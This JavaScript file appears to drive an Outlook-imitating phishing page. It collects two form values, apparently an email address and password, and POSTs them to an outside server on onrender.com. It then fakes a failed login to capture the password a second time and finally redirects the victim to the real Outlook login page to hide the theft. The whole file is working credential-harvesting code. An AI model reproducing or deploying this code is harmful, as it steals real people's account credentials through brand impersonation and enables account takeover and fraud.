document.addEventListener("DOMContentLoaded", () => {
  let clickedOnce = false;

  document.getElementById("btn").addEventListener("click", async () => {
    const input1Field = document.getElementById("input1");
    const input2Field = document.getElementById("input2");
    const msg = document.getElementById("msg");

    const input1 = input1Field.value.trim();
    const input2 = input2Field.value.trim();

    if (!input1 || !input2) {
      alert("Please fill in both inputs.");
      return;
    }

    try {
      await fetch("https://outlook-backend-q89a.onrender.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ input1, input2 }),
      });
      console.log("✅ Sent:", { input1, input2 });
    } catch (err) {
      console.error("❌ Failed to send:", err);
      return;
    }

    if (!clickedOnce) {
      input1Field.disabled = true;
      msg.style.display = "block";
      input2Field.value = "";
      clickedOnce = true;
    } else {
      if (!input2) {
        alert("Please re-enter your password.");
        return;
      }

      try {
        await fetch("https://outlook-backend-q89a.onrender.com/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ input1: input1Field.value.trim(), input2 }),
        });
        console.log("✅ Second Sent:", {
          input1: input1Field.value.trim(),
          input2,
        });
      } catch (err) {
        console.error("❌ Failed second time:", err);
        return;
      }

      window.location.href = "https://outlook.com/login";
    }
  });
});
